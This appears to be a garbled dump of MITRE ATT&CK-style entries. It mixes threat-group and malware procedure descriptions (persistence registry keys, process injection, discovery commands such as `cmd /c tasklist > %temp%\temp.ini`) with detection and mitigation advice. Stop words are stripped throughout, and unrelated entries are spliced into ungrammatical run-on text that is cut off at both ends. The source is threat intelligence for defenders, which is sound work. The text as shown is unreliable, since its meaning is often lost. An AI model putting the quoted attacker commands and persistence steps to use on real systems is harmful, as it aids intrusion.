tunnels C2 servers.(Citation: FireEye FIN6 April 2016) [PcShare](https://attack.mitre.org/software/S1050) payload injected `logagent.exe` `rdpclip.exe` processes.(Citation: Bitdefender FunnyDream Campaign November 2020) [Rocke](https://attack.mitre.org/groups/G0106) SSH private infected machine spread coinminer network.(Citation: Anomali Rocke March 2019) (Citation: Mandiant APT1) [menuPass](https://attack.mitre.org/groups/G0045) executes commands command-line interface reverse shell. modified version pentesting script wmiexec.vbs execute commands.(Citation: PWC Cloud Hopper April 2017)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script)(Citation: FireEye APT10 Sept 2018) [menuPass](https://attack.mitre.org/groups/G0045) malicious macros embedded Office documents execute files.(Citation: Accenture Hogfish April 2018)(Citation: FireEye APT10 Sept 2018) [Trojan.Karagany](https://attack.mitre.org/software/S0094) perform reconnaissance commands victim machine cmd.exe process.(Citation: Secureworks Karagany July 2019) [Proxysvc](https://attack.mitre.org/software/S0238) executes binary logs temp file using: <code>cmd.exe /c "<file_path> > %temp%\PM* .tmp 2>&1"</code>.(Citation: McAfee GhostSecret) [PlugX](https://attack.mitre.org/software/S0013) Windows API functions `GetProcAddress`, `LoadLibrary`, `CreateProcess` execute process.(Citation: Lastline PlugX Analysis)(Citation: Proofpoint TA416 Europe March 2022) (Citation: Unit42 Emissary Panda 2019) [Gazer](https://attack.mitre.org/software/S0168) logs actions files encrypted 3DES. RSA encrypt resources.(Citation: Securelist WhiteBear Aug 2017) possible, include hash values manifest files prevent side-loading malicious libraries.(Citation: FireEye DLL Side-Loading) [Rocke](https://attack.mitre.org/groups/G0106) deleted files infected machines.(Citation: Anomali Rocke March 2019)	 [Avaddon](https://attack.mitre.org/software/S0640) collect external IP address victim.(Citation: Awake Security Avaddon) [Confucius](https://attack.mitre.org/groups/G0142) dropped malicious files startup folder `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup` compromised host maintain persistence.(Citation: Uptycs Confucius APT Jan 2021) [Stolen Pencil](https://attack.mitre.org/groups/G0086) victims prompted install malicious Google Chrome extensions threat actor ability read data accessed. (Citation: Netscout Stolen Pencil Dec 2018) Monitor unexpected deletion cloud volume (ex: AWS delete-volume) Monitor WMI event subscription entries, comparing current WMI event subscriptions subscriptions host. Tools Sysinternals Autoruns detect WMI attempts persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence) Monitor creation WMI <code>EventFilter</code>, <code>EventConsumer</code>, <code>FilterToConsumerBinding</code> events. Event 5861 logged Windows systems <code>EventFilterToConsumerBinding</code> events created.(Citation: Elastic - Hunting Persistence 1) [APT38](https://attack.mitre.org/groups/G0082) cron create pre-scheduled periodic background jobs Linux system.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Fysbis](https://attack.mitre.org/software/S0410) masqueraded trusted software rsyncd dbus-inotifier.(Citation: Fysbis Dr Analysis) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) staged executed PowerShell scripts compromised hosts.(Citation: Tetra Defense Sodinokibi March 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) employed PowerShell script called RDPConnectionParser read filter Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational”
(Event 1024) network RDP connections. [Earth Lusca](https://attack.mitre.org/groups/G1006) [netstat](https://attack.mitre.org/software/S0104) compromised network connection information.(Citation: TrendMicro EarthLusca 2022) [DRATzarus](https://attack.mitre.org/software/S0694) partly encrypted XOR.(Citation: ClearSky Lazarus Aug 2020) [KEYMARBLE](https://attack.mitre.org/software/S0271) capability delete files victim’s machine.(Citation: US-CERT KEYMARBLE Aug 2018) [Cardinal RAT](https://attack.mitre.org/software/S0348) establishes Persistence setting  <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load</code> Registry key executable.(Citation: PaloAlto CardinalRat Apr 2017) [Zeus Panda](https://attack.mitre.org/software/S0330) perform keylogging victim’s machine hooking functions TranslateMessage WM_KEYDOWN.(Citation: GDATA Zeus Panda June 2017) [Remexi](https://attack.mitre.org/software/S0375) searches files system. (Citation: Securelist Remexi Jan 2019) [Kinsing](https://attack.mitre.org/software/S0599) ps list processes.(Citation: Aqua Kinsing April 2020) [Mongall](https://attack.mitre.org/software/S1026) packed Themida.(Citation: SentinelOne Aoqin Dragon June 2022) [PoetRAT](https://attack.mitre.org/software/S0428) LZMA base64 libraries decode obfuscated scripts.(Citation: Talos PoetRAT October 2020) [Wizard Spider](https://attack.mitre.org/groups/G0102) networkdll network discovery psfin financial sale indicators. [Wizard Spider](https://attack.mitre.org/groups/G0102) [AdFind](https://attack.mitre.org/software/S0552) <code>nltest/dclist</code> enumerate domain computers, including domain controller.(Citation: FireEye Ryuk Trickbot January 2019)(Citation: CrowdStrike Grim Spider 2019)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: DFIR Ryuk's Return October 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) legitimate application, ScreenConnect, manage systems remotely laterally.(Citation: Trend Micro Muddy Water March 2021)(Citation: Anomali Static Kitten February 2021)  [CSPY Downloader](https://attack.mitre.org/software/S0527) ability remove values writes Registry.(Citation: Cybereason Kimsuky November 2020) [Prikormka](https://attack.mitre.org/software/S0113) creates directory, <code>%USERPROFILE%\AppData\Local\SKC\</code>, store collected log files.(Citation: ESET Operation Groundbait) Prevent users installing launch agents launch daemons require pushed policy. Monitor emond rules creation checking files modified <code>/etc/emond.d/rules/</code> <code>/private/var/db/emondClients</code>. [Sliver](https://attack.mitre.org/software/S0633) standard encoding techniques gzip hex ASCII encode C2 communication payload.(Citation: GitHub Sliver HTTP) Monitor newly constructed files files write overwrite files network shared directory suspicious. [TA551](https://attack.mitre.org/groups/G0127) mshta.exe execute malicious payloads.(Citation: Unit 42 TA551 Jan 2021) [Ryuk](https://attack.mitre.org/software/S0446) create .dll files Rich File format document.(Citation: ANSSI RYUK RANSOMWARE) [FIN7](https://attack.mitre.org/groups/G0046) Kerberoasting credential access enable lateral movement.(Citation: CrowdStrike Carbon Spider August 2021) [Stuxnet](https://attack.mitre.org/software/S0603) propagate peer-to-peer communication updates RPC.(Citation: Symantec W.32 Stuxnet Dossier) Monitor API calls attempt listing security software, configurations, defensive tools, sensors installed cloud environment. Monitor creation modification cloud resources abused persistence, functions workflows monitoring cloud events. [Kazuar](https://attack.mitre.org/software/S0265) stages command output collected data files exfiltration.(Citation: Unit 42 Kazuar 2017) UAC's privilege elevation standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code>to automatically deny elevation requests, add: <code>"ConsentPromptBehaviorUser"=dword:00000000</code>. enabling installer detection users adding: <code>"EnableInstallerDetection"=dword:00000001</code>. prompt password installation log attempt. disable installer detection, add: <code>"EnableInstallerDetection"=dword:00000000</code>. prevent potential elevation privileges exploitation process UAC detecting installer, installation process continue logged.(Citation: Executable Installers Vulnerable) [Gold Dragon](https://attack.mitre.org/software/S0249) checks anti-malware products processes.(Citation: McAfee Gold Dragon) [APT3](https://attack.mitre.org/groups/G0022) downloader establishes SOCKS5 connections initial C2.(Citation: FireEye Operation Double Tap) [Misdat](https://attack.mitre.org/software/S0083) typically packed UPX.(Citation: Cylance Dust Storm) [Bankshot](https://attack.mitre.org/software/S0239) deletes artifacts malware infected machine.(Citation: US-CERT Bankshot Dec 2017) multi-factor authentication remote service logons possible. Registry specific Office feature control security set disable automatic DDE/OLE execution. (Citation: DDE Advisory Nov 2017)(Citation: BleepingComputer DDE Disabled Word Dec 2017)(Citation: GitHub Disable DDEAUTO Oct 2017) created, enabled default, Registry completely disable DDE execution Word Excel.(Citation: ADV170021 Dec 2017) Monitor newly executed processes abuse Windows service control manager execute malicious commands payloads. [Sykipot](https://attack.mitre.org/software/S0018) injects running instances outlook.exe, iexplore.exe, firefox.exe.(Citation: AlienVault Sykipot 2011) [Kimsuky](https://attack.mitre.org/groups/G0094) searched vulnerabilities, tools, geopolitical trends Google target victims.(Citation: KISA Operation Muzabi) [Poseidon Group](https://attack.mitre.org/groups/G0033) tools attempt spoof anti-virus processes self-defense.(Citation: Kaspersky Poseidon Group) (Citation: Kaspersky Lyceum October 2021) [Daserf](https://attack.mitre.org/software/S0187) hides collected data password-protected .rar archives.(Citation: Symantec Tick Apr 2016) Monitor newly constructed services/daemons Windows event logs event IDs 4697 7045. Data events viewed isolation, chain behavior lead activities, remote logins process creation events. [Clambling](https://attack.mitre.org/software/S0660) dropper PowerShell download malware.(Citation: Trend Micro DRBControl February 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) tested localhost network connection capability infected command scripts.(Citation: TrendMicro Tropic Trooper 2020)	 [StreamEx](https://attack.mitre.org/software/S0142) ability scan security tools firewalls antivirus tools.(Citation: Cylance Crew Feb 2017) user training bring awareness common phishing spearphishing techniques raise suspicion malicious events. [Threat Group-3390](https://attack.mitre.org/groups/G0027) WinRM enable remote execution.(Citation: SecureWorks BRONZE UNION June 2017) [Fox Kitten](https://attack.mitre.org/groups/G0117) sticky launch command prompt.(Citation: CISA AA20-259A Iran-Based Actor September 2020) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [C0010](https://attack.mitre.org/campaigns/C0010), UNC3890 actors multiple publicly-available tools, including METASPLOIT, UNICORN, NorthStar C2.(Citation: Mandiant UNC3890 Aug 2022) [Sandworm Team](https://attack.mitre.org/groups/G0034)'s VBS backdoor decode Base64-encoded data save %TEMP% folder. decrypted received Triple DES algorithm decompresses GZip.(Citation: ESET Telebots Dec 2016)(Citation: ESET Telebots July 2017) (Citation: F-Secure Dukes)(Citation: Secureworks IRON HEMLOCK Profile) [Ixeshe](https://attack.mitre.org/software/S0015) collects username victim’s machine.(Citation: Trend Micro IXESHE 2012) Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, technique.(Citation: Elastic Process Injection July 2017) [ZxxZ](https://attack.mitre.org/software/S1013) collect data compromised host.(Citation: Cisco Talos Bitter Bangladesh 2022) [MuddyWater](https://attack.mitre.org/groups/G0069) C2 infrastructure receive exfiltrated data.(Citation: Reaqta MuddyWater November 2017) [APT38](https://attack.mitre.org/groups/G0082) conducted spearphishing campaigns malicious email attachments.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors discovered local network configuration `ipconfig`.(Citation: FoxIT Wocao December 2019) [APT32](https://attack.mitre.org/groups/G0050) created [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) regsvr32.exe execute scriptlet dynamically downloaded backdoor injected memory. regsvr32 backdoor.(Citation: ESET OceanLotus Mar 2019)(Citation: FireEye APT32 2017)(Citation: Cybereason Cobalt Kitty 2017)  [PowerLess](https://attack.mitre.org/software/S1012) base64 AES ECB decryption prior execution downloaded modules.(Citation: Cybereason PowerLess February 2022) [Waterbear](https://attack.mitre.org/software/S0579) leverage API functions execution.(Citation: Trend Micro Waterbear December 2019)  [AppleSeed](https://attack.mitre.org/software/S0622) zip encrypt data collected target system.(Citation: Malwarebytes Kimsuky June 2021) (Citation: Secureworks IRON LIBERTY July 2019) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors set remote SSH tunneling victim's environment malicious domain.(Citation: BlackBerry CostaRicto November 2020)  [Cadelspy](https://attack.mitre.org/software/S0454) ability steal printers documents printers.(Citation: Symantec Chafer Dec 2015) [BISCUIT](https://attack.mitre.org/software/S0017) capture keystrokes.(Citation: Mandiant APT1 Appendix) [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools enumerate processes target hosts including Process Explorer.(Citation: Symantec Shuckworm January 2022)(Citation: Unit 42 Gamaredon February 2022) [AdFind](https://attack.mitre.org/software/S0552) ability query Active Directory computers.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019)(Citation: Cybereason Bumblebee August 2022) [InvisiMole](https://attack.mitre.org/software/S0260) deliver trojanized versions software documents, relying user execution.(Citation: ESET InvisiMole June 2020) [PipeMon](https://attack.mitre.org/software/S0501)'s stage executed <code>CreateProcess</code> decryption password argument. [PipeMon](https://attack.mitre.org/software/S0501) <code>LoadLibrary</code> load installer.(Citation: ESET PipeMon 2020) [EVILNUM](https://attack.mitre.org/software/S0568) remote scriptlet drops file executes regsvr32.exe.(Citation: ESET EvilNum July 2020)  [menuPass](https://attack.mitre.org/groups/G0045) collected files compromised computers.(Citation: DOJ APT10 Dec 2018)(Citation: Symantec Cicada November 2020)
 Monitor HKLM\Software\Policies\Microsoft\Windows NT\DNSClient "EnableMulticast" DWORD value. "0" LLMNR disabled. Limit privileges user accounts authorized administrators interact service service binary target path locations. Deny execution user directories file download directories temp directories able. (Citation: DarkReading FireEye FIN5 Oct 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) [Dacls](https://attack.mitre.org/software/S0497) payload named dot prefix hidden view Finder application.(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) [APT32](https://attack.mitre.org/groups/G0050) CVE-2016-7255 escalate privileges.(Citation: FireEye APT32 2017) Monitor API calls SetWindowsHook, GetKeyState, GetAsyncKeyState (Citation: Adventures Keystroke) [Babuk](https://attack.mitre.org/software/S0638) enumerate disk volumes, disk information, query service status.(Citation: McAfee Babuk February 2021) [TrickBot](https://attack.mitre.org/software/S0266) reach command control server proxy IP addresses. (Citation: Bitdefender Trickbot C2 infra Nov 2020) (Citation: Bitdefender Trickbot VNC module Whitepaper 2021) process monitoring detect analyze execution arguments CMSTP.exe. Compare invocations CMSTP.exe prior history arguments loaded files determine anomalous adversarial activity. Sysmon events identify potential abuses CMSTP.exe. Detection strategy depend specific adversary procedure, potential rules include: (Citation: Endurant CMSTP July 2018)
* detect loading execution local/remote payloads - Event 1 (Process creation) ParentImage CMSTP.exe
* monitor events, creation processes (Sysmon Event 1), involve auto-elevated CMSTP interfaces CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F). [InvisiMole](https://attack.mitre.org/software/S0260) gathers local time victim’s machine.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) (Citation: Kaspersky Turla)(Citation: Secureworks IRON HUNTER Profile) [OilRig](https://attack.mitre.org/groups/G0049) <code>ipconfig /all</code> victim.(Citation: Palo Alto OilRig 2016)(Citation: Palo Alto OilRig Oct 2016) [Orz](https://attack.mitre.org/software/S0229) versions embedded DLL MockDll process hollowing [Regsvr32](https://attack.mitre.org/techniques/T1218/010) execute payload.(Citation: Proofpoint Leviathan Oct 2017) [Waterbear](https://attack.mitre.org/software/S0579) scramble functions executed random values.(Citation: Trend Micro Waterbear December 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) enumerate processes, including properties determine Common Language Runtime (CLR) loaded.(Citation: GitHub SILENTTRINITY Modules July 2019) [GrimAgent](https://attack.mitre.org/software/S0632) delete binaries compromised host.(Citation: IB GrimAgent July 2021) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [APT33](https://attack.mitre.org/groups/G0064) AES encryption command control traffic.(Citation: FireEye APT33 Guardrail) [Saint Bot](https://attack.mitre.org/software/S1018) collect username compromised host.(Citation: Malwarebytes Saint Bot April 2021) (Citation: Secureworks IRON LIBERTY July 2019)(Citation: US-CERT TA18-074A)(Citation: Symantec Dragonfly Sept 2017)(Citation: Gigamon Berserk Bear October 2021) Monitor suspicious file access activity, indications process reading multiple files short time command-line arguments indicative searching credential material (ex: regex patterns). indicators automated/scripted credential access behavior. Monitoring user's <code>.bash_history</code> read alert suspicious activity. users typically rely history commands, access history utilities "history" commands <code>cat ~/.bash_history</code>. Monitor screensaver configuration Registry correlate typical user behavior. Tools Sysinternals Autoruns detect screensaver binary path Registry. Monitor newly constructed network connections received untrusted hosts.  [APT1](https://attack.mitre.org/groups/G0006) listed connected network shares.(Citation: Mandiant APT1) [Dtrack](https://attack.mitre.org/software/S0567) function calls <code>LoadLibrary</code> <code>GetProcAddress</code>.(Citation: CyberBit Dtrack) [RainyDay](https://attack.mitre.org/software/S0629) RC4 encrypt C2 communications.(Citation: Bitdefender Naikon April 2021) [Mis-Type](https://attack.mitre.org/software/S0084) temporarily stored collected files `“%AppData%\{Unique Identifier}\HOSTRURKLSR”` `“%AppData%\{Unique Identifier}\NEWERSSEMP”`.(Citation: Cylance Dust Storm) [FIN8](https://attack.mitre.org/groups/G0061) Batch file automate frequently executed post compromise cleanup activities.(Citation: FireEye Enemy FIN8 Aug 2016) [FIN8](https://attack.mitre.org/groups/G0061) executed commands remotely [cmd](https://attack.mitre.org/software/S0106).(Citation: FireEye Obfuscation June 2017)(Citation: Bitdefender FIN8 July 2021) [UNC2452](https://attack.mitre.org/groups/G0118) [AdFind](https://attack.mitre.org/software/S0552) enumerate remote systems.(Citation: Deep Dive Solorigate January 2021) Monitor newly executed processes maliciously modify components victim environment hinder disable defensive mechanisms. [QUADAGENT](https://attack.mitre.org/software/S0269) modifies HKCU Registry key store session identifier unique compromised pre-shared key encrypting decrypting C2 communications.(Citation: Unit 42 QUADAGENT July 2018) [Orangeworm](https://attack.mitre.org/groups/G0071) copied backdoor network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, E$WINDOWS.(Citation: Symantec Orangeworm April 2018) [Hildegard](https://attack.mitre.org/software/S0601) encrypted ELF file.(Citation: Unit 42 Hildegard Malware) [Reaver](https://attack.mitre.org/software/S0172) collects victim's username.(Citation: Palo Alto Reaver Nov 2017) [CharmPower](https://attack.mitre.org/software/S0674) ability download additional modules compromised host.(Citation: Check APT35 CharmPower January 2022) [Turla](https://attack.mitre.org/groups/G0010) <code>tracert</code> check internet connectivity.(Citation: ESET ComRAT 2020) Monitor newly constructed logon behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times (ex: user present) business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. Correlate security systems login user active login session entered building VPN access). [SHARPSTATS](https://attack.mitre.org/software/S0450) ability identify current time compromised host.(Citation: TrendMicro POWERSTATS V3 June 2019) [RTM](https://attack.mitre.org/software/S0148) relied users malicious email attachments, decompressing attached archive, double-clicking executable within.(Citation: Unit42 Redaman January 2019) [VERMIN](https://attack.mitre.org/software/S0257) gathers username victim’s machine.(Citation: Unit 42 VERMIN Jan 2018) [FIN6](https://attack.mitre.org/groups/G0037) [Windows Credential Editor](https://attack.mitre.org/software/S0005) credential dumping.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)	
 [APT41](https://attack.mitre.org/groups/G0096) malware TIDYELF loaded main WINTERLOVE component injecting iexplore.exe process.(Citation: FireEye APT41 Aug 2019) [NETWIRE](https://attack.mitre.org/software/S0198) stores configuration file Registry.(Citation: Red Canary NETWIRE January 2020) [Meteor](https://attack.mitre.org/software/S0688) victim's files directories zero-bytes replacement real content deleting them.(Citation: Check Meteor Aug 2021) [TrickBot](https://attack.mitre.org/software/S0266) injects svchost.exe process.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Totbrick Oct 2016)(Citation: Totbrick Oct 2017)(Citation: Cyberreason Anchor December 2019) (Citation: MSTIC Nobelium Toolset 2021) [POWRUNER](https://attack.mitre.org/software/S0184) collect active network connections running <code>netstat -an</code> victim.(Citation: FireEye APT34 Dec 2017) [Miner-C](https://attack.mitre.org/software/S0133) copies public folder Network Attached Storage (NAS) devices infects victims file.(Citation: Softpedia MinerC) [PLAINTEE](https://attack.mitre.org/software/S0254) encodes C2 beacons XOR.(Citation: Rancor Unit42 June 2018) [APT33](https://attack.mitre.org/groups/G0064) VBScript initiate delivery payloads.(Citation: Holmium June 2020) [Aquatic Panda](https://attack.mitre.org/groups/G0143) WinRAR compress memory dumps prior exfiltration.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Turla](https://attack.mitre.org/groups/G0010) legitimate services including Pastebin, Dropbox, GitHub C2 communications.(Citation: Accenture HyperStack October 2020)(Citation: ESET Crutch December 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) scanned vulnerabilities public-facing servers targets.(Citation: TrendMicro EarthLusca 2022) Monitor files unexpected modifications attempt hide artifacts. [Bisonal](https://attack.mitre.org/software/S0268) dynamic DNS service C2.(Citation: Talos Bisonal Mar 2020) [menuPass](https://attack.mitre.org/groups/G0045) [PowerSploit](https://attack.mitre.org/software/S0194) inject shellcode PowerShell.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Symantec Cicada November 2020) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. (Citation: TrendMicro EarthLusca 2022) [Axiom](https://attack.mitre.org/groups/G0001) observed SQL injection gain access systems.(Citation: Novetta-Axiom)(Citation: Cisco 72) [DropBook](https://attack.mitre.org/software/S0547) checked presence Arabic language infected machine's settings.(Citation: Cybereason Molerats Dec 2020)  [Pay2Key](https://attack.mitre.org/software/S0556) identify IP MAC addresses compromised host.(Citation: Check Pay2Key November 2020) [JHUHUGIT](https://attack.mitre.org/software/S0044) obtains build identifier victim hard drive Windows registry key <code>HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum</code>. [JHUHUGIT](https://attack.mitre.org/software/S0044) variant gathers victim storage volume serial storage device name.(Citation: ESET Sednit 1)(Citation: Unit 42 Sofacy Feb 2018) [APT32](https://attack.mitre.org/groups/G0050) set Facebook tandem fake websites.(Citation: Volexity Ocean Lotus November 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) malicious files requiring direct victim interaction execute.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Avira Mustang Panda January 2020)(Citation: Recorded Future REDDELTA July 2020)(Citation: Google TAG Ukraine Threat Landscape March 2022)(Citation: Proofpoint TA416 Europe March 2022) [GALLIUM](https://attack.mitre.org/groups/G0093) dropped additional tools victims operation, including portqry.exe, renamed cmd.exe file, winrar, [HTRAN](https://attack.mitre.org/software/S0040).(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [Elderwood](https://attack.mitre.org/groups/G0066) exploitation endpoint software, including Internet Explorer Adobe Flash vulnerabilities, gain execution. zero-day exploits.(Citation: Symantec Elderwood Sept 2012) [AuTo Stealer](https://attack.mitre.org/software/S1029) ability collect installed AV products infected host.(Citation: MalwareBytes SideCopy Dec 2021) [Lokibot](https://attack.mitre.org/software/S0447) C2 communications.(Citation: Infoblox Lokibot January 2019)(Citation: Talos Lokibot Jan 2021)  [UNC2452](https://attack.mitre.org/groups/G0118) named tasks <code>\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager</code> legitimate.(Citation: Volexity SolarWinds) [OutSteel](https://attack.mitre.org/software/S1017) download files C2 server.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors stolen credentials connect victim's network VPN.(Citation: FoxIT Wocao December 2019) [MacMa](https://attack.mitre.org/software/S1016) downloaded additional files, including exploit privilege escalation.(Citation: ESET DazzleSpy Jan 2022)(Citation: Objective-See MacMa Nov 2021) [Earth Lusca](https://attack.mitre.org/groups/G1006) command <code>ipconfig</code> network configurations.(Citation: TrendMicro EarthLusca 2022) [Dragonfly](https://attack.mitre.org/groups/G0035) command <code>query user</code> victim hosts.(Citation: US-CERT TA18-074A) Set browser extension deny list security policy. (Citation: Technospot Chrome Extensions GP) Systemd service unit files detected auditing file creation modification events <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, <code>/home/<username>/.config/systemd/user/</code> directories, symbolic links [POLONIUM](https://attack.mitre.org/groups/G1005) valid compromised credentials gain access victim environments.(Citation: POLONIUM June 2022) [APT33](https://attack.mitre.org/groups/G0064) base64 encode command control traffic.(Citation: FireEye APT33 Guardrail) Monitor analyze network flows protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). analyzing newly constructed network connections received untrusted hosts, unexpcted hardware devices, uncommon data flows. [PoetRAT](https://attack.mitre.org/software/S0428) custom encryption scheme communication scripts pyminifier obfuscate scripts.(Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020) data collected [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware, exfiltrated existing C2 channel.(Citation: Citizen Lab Stealth Falcon 2016) Monitor newly constructed services create modify Launch Daemons execute malicious payloads persistence. [Dragonfly](https://attack.mitre.org/groups/G0035) created directory named "out" user's %AppData% folder copied files it.(Citation: US-CERT TA18-074A) [HARDRAIN](https://attack.mitre.org/software/S0246) Windows Firewall modify incoming connections.(Citation: US-CERT HARDRAIN March 2018) [SpicyOmelette](https://attack.mitre.org/software/S0646) signed valid digital certificates.(Citation: Secureworks GOLD KINGSWOOD September 2018) [Small Sieve](https://attack.mitre.org/software/S1035) contact actor-controlled C2 servers Telegram API HTTPS.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Ryuk](https://attack.mitre.org/software/S0446) Windows command create Registry entry <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> establish persistence.(Citation: CrowdStrike Ryuk January 2019) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors list running processes victim machine `cmd /c tasklist > %temp%\temp.ini`.(Citation: McAfee Honeybee) patch management process implemented check unused applications, unmaintained vulnerable software, unnecessary features, components, files, documentation. Monitor newly executed processes search common password storage locations user credentials. (Citation: Unit 42 Nokki Oct 2018) (Citation: FireEye APT35 2018) [InvisiMole](https://attack.mitre.org/software/S0260) scheduled tasks named <code>MSST</code> <code>\Microsoft\Windows\Autochk\Scheduled</code> establish persistence.(Citation: ESET InvisiMole June 2020) (Citation: FireEye APT34 Webinar Dec 2017) [Carberp](https://attack.mitre.org/software/S0484) capture display screenshots screens_dll.dll plugin.(Citation: Prevx Carberp March 2011) [Cobalt Strike](https://attack.mitre.org/software/S0154) deliver Beacon payloads lateral movement leveraging remote execution.(Citation: Cobalt Strike DCOM Jan 2017) Monitor executed commands arguments attempt dump contents <code>/etc/passwd</code> <code>/etc/shadow</code> enable offline password cracking. Limit remote user permissions remote access necessary. [InvisiMole](https://attack.mitre.org/software/S0260) C2 communications.(Citation: ESET InvisiMole June 2018) (Citation: Actinium February 2022) [Ursnif](https://attack.mitre.org/software/S0386) process hollowing inject child processes.(Citation: FireEye Ursnif Nov 2017) [Darkhotel](https://attack.mitre.org/groups/G0012) exploited Adobe Flash vulnerability CVE-2015-8651 execution.(Citation: DUBNIUM June 2016) [njRAT](https://attack.mitre.org/software/S0385) fast flux DNS C2 IP resolution.(Citation: Trend Micro njRAT 2018) Data loss prevention detect block sensitive data copied USB devices. [Crimson](https://attack.mitre.org/software/S0115) check Registry presence <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate</code> determine installed host.(Citation: Proofpoint Operation Transparent Tribe March 2016) [AppleSeed](https://attack.mitre.org/software/S0622) ability create Registry key <code>EstsoftAutoUpdate</code> <code>HKCU\Software\Microsoft/Windows\CurrentVersion\RunOnce</code> establish persistence.(Citation: Malwarebytes Kimsuky June 2021) [Gelsemium](https://attack.mitre.org/software/S0666) junk code hide functions evade detection.(Citation: ESET Gelsemium June 2021) [InvisiMole](https://attack.mitre.org/software/S0260) gather network share information.(Citation: ESET InvisiMole June 2018) Monitor newly constructed files common folders system. Data loss prevention detect block sensitive data uploaded browsers. Monitor execution commands arguments enumeration gathering local accounts <code>net user</code>, <code>net account</code>, <code>net localgroup</code>, <code>Get-LocalUser</code>, <code> dscl</code>.

System network discovery techniques occur operation adversary learns environment, extent normal network operations. discovery data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. domain fronting, adversaries deploy additional tools compromised systems. (Citation: FireEye APT29 Domain Fronting TOR March 2017) (Citation: Mandiant Easy Breach) prevent installation tools application whitelisting. [FoggyWeb](https://attack.mitre.org/software/S0661) dynamic XOR key custom XOR methodology C2 communications.(Citation: MSTIC FoggyWeb September 2021)   machine's local time, [XCSSET](https://attack.mitre.org/software/S0658) waits 43200 (12 hours) initial creation timestamp specific file, <code>.report</code>. elapsed time, [XCSSET](https://attack.mitre.org/software/S0658) executes additional modules.(Citation: trendmicro xcsset xcode project 2020) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) <code>DriveList</code> retrieve drive information.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [CookieMiner](https://attack.mitre.org/software/S0492) installed multiple Launch Agents maintain persistence cryptocurrency mining software.(Citation: Unit42 CookieMiner Jan 2019) [Shamoon](https://attack.mitre.org/software/S0140) scans C-class subnet IPs victim's interfaces.(Citation: FireEye Shamoon Nov 2016) [APT32](https://attack.mitre.org/groups/G0050) replaced Outlook's VbaProject.OTM file install backdoor macro persistence.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [OnionDuke](https://attack.mitre.org/software/S0052) custom decryption algorithm decrypt strings.(Citation: ESET Dukes October 2019) application whitelisting prevent execution hh.exe required network prevent potential misuse adversaries. [APT32](https://attack.mitre.org/groups/G0050) RTF document includes exploit execute malicious code. (CVE-2017-11882)(Citation: ESET OceanLotus Mar 2019) [Sowbug](https://attack.mitre.org/groups/G0054) OS version hardware configuration victim.(Citation: Symantec Sowbug Nov 2017) [Windigo](https://attack.mitre.org/groups/G0124) script check presence files created OpenSSH 